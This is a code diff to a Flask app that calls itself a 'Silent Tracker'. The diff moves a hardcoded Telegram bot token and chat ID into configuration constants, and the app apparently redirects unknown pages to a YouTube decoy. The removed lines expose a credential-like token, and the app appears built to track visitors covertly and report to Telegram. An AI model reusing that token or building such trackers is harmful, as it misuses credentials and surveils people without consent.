@@ -26,8 +26,8 @@ class TelegramNotifier:
     @staticmethod
     def send_async(message: str):
         def _send():
-            token = 8966725315:AAFqPRQ2iqchGo0_R9uY-vc 7SjYOSCu1zQ0
-            chat_id = 1497190595
+            token = TELEGRAM_TOKEN
+            chat_id = TELEGRAM_CHAT_ID
             if not token or not chat_id:
                 logger.warning("Telegram credentials not configured properly.")
                 return
@@ -278,5 +278,5 @@ def page_not_found(e):
     return redirect(TARGET_YOUTUBE_URL), 302
 
 if __name__ == '__main__':
-    print("[*] Silent Tracker Core Active. Target Bound to Telegram Chat ID:", 1497190595)
+    print("[*] Silent Tracker Core Active. Target Bound to Telegram Chat ID:", TELEGRAM_CHAT_ID)
     app.run(host='0.0.0.0', port=5000, threaded=True)
